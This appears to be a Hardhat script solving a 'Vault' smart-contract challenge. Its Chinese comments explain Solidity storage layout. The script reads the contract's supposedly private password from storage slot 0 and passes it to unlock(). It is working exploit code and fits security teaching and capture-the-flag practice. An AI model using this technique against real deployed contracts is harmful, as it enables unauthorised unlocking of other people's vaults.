import hre from "hardhat";

async function main() {
    const vault_address = "";
    
    const vault = await ethers.getContractAt("Vault", vault_address);

    console.log("目前金庫鎖的狀態: ", await vault.locked());
    console.log(`Vault is ${(await vault.locked()) ? "LOCKED" : "UNLOCKED" }`); 

    // 調查變數存在區塊鏈的 storage slot 
    // Solidity 會將變數按宣告順序儲存到 Storage slot 當中
    const storageSlot = 0;
    const password = await hre.ethers.provider.getStorageAt(vault_address, storageSlot);
    console.log("password: ", password);

    // 解鎖
    await vault.unlock(password);

    console.log(`Vault is ${(await vault.locked()) ? "LOCKED" : "UNLOCKED" }`); 


}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });